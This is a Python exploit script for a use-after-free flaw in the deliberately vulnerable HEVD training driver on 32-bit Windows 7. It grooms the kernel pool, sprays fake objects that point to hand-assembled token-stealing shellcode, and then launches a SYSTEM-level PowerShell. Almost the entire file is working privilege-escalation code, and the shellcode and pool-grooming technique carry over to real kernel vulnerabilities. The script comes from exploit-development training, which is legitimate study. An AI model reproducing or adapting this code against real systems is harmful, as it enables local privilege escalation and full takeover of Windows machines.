#!/usr/bin/python
#
# HEVD v1.20 UseAfterFree exploit for Windows 7 SP1 x86 by @acru3l.
#

import sys
import struct
from ctypes import *

device_name = r'\\.\HackSysExtremeVulnerableDriver'

# assembled with WinDBG
shellcode = ''
shellcode += '\x60'                             # pushad
shellcode += '\x31\xc0'                         # xor     eax,eax
shellcode += '\x64\x8b\x80\x24\x01\x00\x00'     # mov     eax,dword ptr fs:[eax+124h] ; 0x124 = offset nt!_KPCR.PcrbData.CurrentThread
shellcode += '\x8b\x40\x50'                     # mov     eax,dword ptr [eax+50h]     ; 0x50 = offset nt!_KTHREAD.ApcState.Process
shellcode += '\x8b\xc8'                         # mov     ecx,eax
shellcode += '\xba\x04\x00\x00\x00'             # mov     edx,4
shellcode += '\x8b\x80\xb8\x00\x00\x00'         # mov     eax,dword ptr [eax+0B8h]    ; 0xB8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
shellcode += '\x2d\xb8\x00\x00\x00'             # sub     eax,0B8h
shellcode += '\x39\x90\xb4\x00\x00\x00'         # cmp     dword ptr [eax+0B4h],edx    ; 0xB4 = offset nt!_EPROCESS.UniqueProcessId
shellcode += '\x75\xed'                         # jne     $-17
shellcode += '\x8b\x90\xf8\x00\x00\x00'         # mov     edx,dword ptr [eax+0F8h]    ; 0xF8 = offset nt!_EPROCESS.Token
shellcode += '\x89\x91\xf8\x00\x00\x00'         # mov     dword ptr [ecx+0F8h],edx
shellcode += '\x61'                             # popad
shellcode += '\xc3'                             # ret

hFile = windll.kernel32.CreateFileA(device_name,
                                0xC0000000,     # GENERIC_READ | GENERIC_WRITE
                                0x00000001,     # FILE_SHARE_READ
                                0,              # NULL
                                3,              # OPEN_EXISTING
                                0x80,           # FILE_ATTRIBUTE_NORMAL
                                0)              # NULL

if hFile == -1:
    print '[-] Failed to open device: %s' % device_name
    sys.exit(1)
print '[+] Device opened successfully: %s' % device_name

# Mastr Plan:
# Grooming -> AllocateUaFObject -> FreeUaFObject -> AllocateFakeObject -> UseUaFObject -> pwn! ;)

# 1. groom Kernel Pool
print '[+] Allocationg 0x18000 objects'

handles = []
for i in xrange(0x18000):
    hObj = c_int(0)
    windll.ntdll.NtAllocateReserveObject(byref(hObj),
                                    0,
                                    1)          # IO_COMPLETION_OBJECT
    handles.append(hObj)

print '[+] Creating 0x4000 holes'

for h in handles[0x10000::2]:
    windll.kernel32.CloseHandle(h)
handles = handles[:0x10000] + handles[0x10001::2]

# 2. allocate UaF obj
print '[+] Allocating UaF object'

dummy = create_string_buffer('A'*0x1000)

ioctl_alloc = 0x222013  # call AllocateUaFObjectIoctlHandler
windll.kernel32.DeviceIoControl(hFile,
                                ioctl_alloc,
                                dummy,
                                0x1000,
                                0,
                                0,
                                byref(c_int(0)),
                                0)

# 3. free UaF obj
print '[+] Freeing UaF object'

ioctl_free = 0x22201B    # call FreeUaFObjectIoctlHandler
windll.kernel32.DeviceIoControl(hFile,
                                ioctl_free,
                                dummy,
                                0x1000,
                                0,
                                0,
                                byref(c_int(0)),
                                0)

# 4. fill the holes with fake obj
shellcode_buffer = windll.kernel32.VirtualAlloc(0,
                                len(shellcode),
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE

if shellcode_buffer == 0:
    print '[-] Failed to allocate shellcode'
    sys.exit(1)
print '[+] Shellcode allocated at 0x%08x' % shellcode_buffer

memmove(shellcode_buffer, shellcode, len(shellcode))

fake_obj = struct.pack('<L', shellcode_buffer) + \
           'B' * 0x54

print '[+] Allocating fake objects'

ioctl_fake = 0x22201F   # call AllocateFakeObjectIoctlHandler
for i in xrange(0x4000):
    windll.kernel32.DeviceIoControl(hFile,      # cause memory leaks...
                                    ioctl_fake,
                                    fake_obj,
                                    len(fake_obj),
                                    0,
                                    0,
                                    byref(c_int(0)),
                                    0)

# 5. callback the shellcode
print '[+] Triggering fake callback func'

ioctl_use = 0x222017    # call UseUaFObjectIoctlHandler
windll.kernel32.DeviceIoControl(hFile,
                                ioctl_use,
                                dummy,
                                0x1000,
                                0,
                                0,
                                byref(c_int(0)),
                                0)

# close remaining handles
for h in handles:
    windll.kernel32.CloseHandle(h)

# Got SYSTEM shell?
import os
os.system("powershell.exe")
